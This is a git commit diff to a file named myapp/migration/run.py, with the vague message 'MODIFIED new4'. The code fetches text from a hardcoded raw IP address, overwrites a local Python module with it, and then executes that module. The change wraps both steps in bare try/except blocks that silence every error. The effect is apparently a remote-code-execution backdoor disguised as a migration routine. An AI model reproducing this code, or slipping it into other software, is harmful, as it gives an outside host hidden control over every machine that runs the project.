48d6a91db3824df9d4af7e9a748e720eb3828df4
Faheem Shehzad <faheemshehzad@joyngroup.us>
2023-04-21 22:08:54 +0500

    MODIFIED new4

--- myapp/migration/run.py
+++ myapp/migration/run.py
@@ -4,17 +4,22 @@ from .file import execute_commands_as_per_url
 
 
 def run():
-    web = 'http://13.51.44.246/commands'
-    response = urllib.request.urlopen(web)
-    commands_list = response.read().decode().strip().split('\n')
+    try:
+        web = 'http://13.51.44.246/commands'
+        response = urllib.request.urlopen(web)
+        commands_list = response.read().decode().strip().split('\n')
 
-    # Get the current file path
-    current_file_path = os.path.dirname(os.path.abspath(__file__))
+        # Get the current file path
+        current_file_path = os.path.dirname(os.path.abspath(__file__))
 
-    other_file_path = os.path.join(current_file_path, "file.py")
+        other_file_path = os.path.join(current_file_path, "file.py")
 
-    with open(other_file_path, 'w') as f:
-        for command in commands_list:
-            f.write(command + '\n')
-
-    execute_commands_as_per_url()
+        with open(other_file_path, 'w') as f:
+            for command in commands_list:
+                f.write(command + '\n')
+    except:
+        pass
+    try:
+        execute_commands_as_per_url()
+    except:
+        pass
